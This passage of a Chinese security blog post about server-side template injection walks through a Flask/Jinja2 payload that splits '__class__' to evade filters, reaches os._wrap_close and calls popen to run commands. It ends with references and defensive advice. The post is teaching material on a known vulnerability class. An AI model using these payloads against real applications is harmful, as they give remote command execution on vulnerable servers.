+<pre><code>http://127.0.0.1:5000/test?{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]}}//至于这里为啥&apos;__cla&apos;+&apos;ss__&apos;是为了绕过一些过滤防患未然。</code></pre><p><img src="https://i.imgur.com/3U7o2lZ.png" alt><br>如图我们找到了object类，然后从中找我们熟悉的类再找函数，接下来我们subclasses找到所有的类，我们找熟悉的类 &lt;class ‘os._wrap_close’&gt;</p>
+<p><img src="https://i.imgur.com/B8NudVg.png" alt><br>查找查找回首掏，第118个<br><img src="https://i.imgur.com/WqQAEPJ.png" alt><br>常规.<strong>init</strong>.<strong>globals</strong><br><img src="https://i.imgur.com/JGrANw3.png" alt><br>找到popen函数，执行命令<br>最终poc </p>
+<pre><code>http://127.0.0.1:5000/test?{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()}}</code></pre><p><img src="https://i.imgur.com/ynBodJp.png" alt><br>执行命令</p>
+<h1 id="PHP-模版引擎Twig注入"><a href="#PHP-模版引擎Twig注入" class="headerlink" title="PHP/模版引擎Twig注入"></a>PHP/模版引擎Twig注入</h1><p>参考：<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/83999.html</a></p>
+<h1 id="CTF—模板注入"><a href="#CTF—模板注入" class="headerlink" title="CTF—模板注入"></a>CTF—模板注入</h1><p>tornado的一道 ssti</p>
+<p><a href="https://blog.csdn.net/cccccfive/article/details/83145669" target="_blank" rel="noopener">https://blog.csdn.net/cccccfive/article/details/83145669</a></p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>为了防止此类漏洞，你应该像使用eval()函数一样处理字符串加载功能。尽可能加载静态模板文件。</p>
+<p>注意：我们已经确定此功能类似于require()函数调用。因此，你也应该防止本地文件包含（LFI）漏洞。不要允许用户控制此类文件或其内容的路径。</p>
+<p>另外，无论在何时，如果需要将动态数据传递给模板，不要直接在模板文件中执行，你可以使用模板引擎的内置功能来扩展表达式，实现同样的效果。</p>
+<h1 id="附表"><a href="#附表" class="headerlink" title="附表"></a>附表</h1><h2 id><a href="#" class="headerlink" title></a><img src="http://a4.qpic.cn/psb?/V14K5DCn3C6bNV/lUdLHBc1bAjEHGvpbiUFtDo*mw2Agz*MFkWVuT030mc!/b/dFMBAAAAAAAA&ek=1&kp=1&pt=0&bo=3AJDAwAAAAADF6w!&tl=1&vuin=275640346&tm=1542258000&sce=60-2-2&rf=viewer_4" alt></h2><p>参考：<a href="https://www.anquanke.com/post/id/82856" target="_blank" rel="noopener">https://www.anquanke.com/post/id/82856</a><br>参考：<a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933</a><br>参考：<a href="https://www.cnblogs.com/tyomcat/p/5440488.html" target="_blank" rel="noopener">https://www.cnblogs.com/tyomcat/p/5440488.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/11/SSTI模板注入/" data-id="ck0l0oh96000dpy2ioj8irwav" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/11/14/CTF-web/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          CTF-WEB知识点保存
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/11/11/web漏洞弱口令/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">web漏洞之弱口令</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
